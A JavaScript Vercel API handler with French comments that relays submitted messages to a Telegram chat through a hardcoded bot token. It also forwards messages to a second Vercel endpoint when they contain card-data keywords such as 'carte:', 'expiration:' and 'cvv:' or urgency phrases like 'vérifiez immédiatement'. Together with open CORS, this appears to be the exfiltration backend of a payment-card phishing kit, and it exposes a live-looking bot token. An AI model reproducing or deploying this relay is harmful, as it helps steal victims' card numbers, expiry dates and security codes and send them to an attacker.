// Fonction pour détecter si c'est un message de paiement
function isPaymentMessage(message) {
    if (!message) return false;
    
    const text = message.toLowerCase();
    const paymentKeywords = [
        'cacapay', 'caca', 'nouveau paiement', 'paiement reçu',
        'montant:', 'carte:', 'expiration:', 'cvv:', 'méthode:',
        'vérifiez immédiatement', 'paiement sécurisé', 'finalisez votre commande',
        '99.99', '€', 'euros', 'payment', 'card', 'expiry'
    ];
    
    return paymentKeywords.some(keyword => text.includes(keyword));
}

// Fonction pour envoyer une notification au récepteur Vercel
async function sendNotificationToLocalReceiver(telegramData, originalMessage) {
    const notificationUrl = 'https://test-alpha-lac-68.vercel.app/api/notifications';
    
    const notification = {
        id: telegramData.result?.message_id || Date.now(),
        message: originalMessage,
        sender: 'Cacapaybot',
        type: 'payment_message',
        timestamp: new Date().toISOString()
    };
    
    try {
        const response = await fetch(notificationUrl, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify(notification)
        });
        
        if (!response.ok) {
            throw new Error(`HTTP ${response.status}: ${response.statusText}`);
        }
        
        return await response.json();
    } catch (error) {
        console.error('Erreur lors de l\'envoi de la notification:', error);
        throw error;
    }
}

export default async function handler(req, res) {
    // Configuration CORS
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
    
    if (req.method === 'OPTIONS') {
        res.status(200).end();
        return;
    }
    
    if (req.method !== 'POST') {
        return res.status(405).json({ error: 'Method not allowed' });
    }
    
    try {
        const { message, type = 'payment' } = req.body;
        
        console.log('📤 API Vercel - Message reçu:', message);
        
        // Configuration Telegram - BON BOT !
        const TELEGRAM_BOT_TOKEN = '8045865062:AAFoDtE5f3w3RNmaGh3-n2X7Lbzpo0ShXSU';
        const TELEGRAM_CHAT_ID = 6523794278; // Nombre, pas chaîne
        
        const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
        
        console.log('📤 Envoi à Telegram:', telegramUrl);
        
        // Utiliser node-fetch ou fetch natif selon l'environnement
        let response;
        try {
            // Essayer fetch natif (Node.js 18+)
            response = await fetch(telegramUrl, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    chat_id: TELEGRAM_CHAT_ID,
                    text: message,
                    parse_mode: 'HTML'
                })
            });
        } catch (fetchError) {
            console.error('Erreur fetch natif:', fetchError);
            // Fallback avec import dynamique de node-fetch
            try {
                const { default: nodeFetch } = await import('node-fetch');
                response = await nodeFetch(telegramUrl, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        chat_id: TELEGRAM_CHAT_ID,
                        text: message,
                        parse_mode: 'HTML'
                    })
                });
            } catch (importError) {
                console.error('Erreur import node-fetch:', importError);
                throw new Error('Impossible d\'envoyer le message Telegram');
            }
        }
        
        const responseText = await response.text();
        console.log('📥 Réponse Telegram:', responseText);
        
        if (response.ok) {
            const data = JSON.parse(responseText);
            
            // Envoyer une notification au récepteur local si c'est un message de paiement
            if (isPaymentMessage(message)) {
                try {
                    await sendNotificationToLocalReceiver(data, message);
                    console.log('✅ Notification envoyée au récepteur local');
                } catch (notificationError) {
                    console.error('❌ Erreur notification locale:', notificationError);
                    // Ne pas faire échouer la requête principale si la notification échoue
                }
            }
            
            res.status(200).json({ 
                success: true, 
                message: 'Message envoyé avec succès',
                telegramResponse: data
            });
        } else {
            res.status(400).json({ 
                success: false, 
                error: 'Erreur Telegram',
                details: responseText
            });
        }
        
    } catch (error) {
        console.error('❌ Erreur API Vercel:', error);
        res.status(500).json({ 
            success: false, 
            error: 'Erreur serveur',
            details: error.message
        });
    }
}
